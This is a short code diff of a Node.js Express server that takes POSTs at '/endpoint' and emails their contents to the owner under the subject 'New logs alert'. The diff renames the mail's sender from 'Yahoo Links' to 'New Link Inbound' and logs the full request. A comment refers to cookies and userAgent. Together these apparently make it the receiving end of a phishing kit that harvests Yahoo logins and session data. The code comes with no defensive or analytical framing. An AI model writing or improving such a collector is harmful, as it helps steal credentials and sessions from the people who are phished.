@@ -19,7 +19,7 @@ const transporter = nodemailer.createTransport({
 async function sender(payload) {
   // send mail with defined transport object
   const info = await transporter.sendMail({
-    from: `"Yahoo Links 👻" <${process.env.Emailaddress}>`, // sender address
+    from: `"New Link Inbound 👻" <${process.env.Emailaddress}>`, // sender address
     to: `${process.env.Emailaddress}`, // list of receivers
     subject: "New logs alert ✔", // Subject line
     html: `${payload?.body}\n\n`
@@ -55,7 +55,7 @@ app.post("/endpoint", async (req, res) => {
         body
     }
     await sender(payload);
-    console.log(payload)
+    console.log(payload, {req})
     return res.json({ body }).status(200); // Include cookies and userAgent in response
 });
 
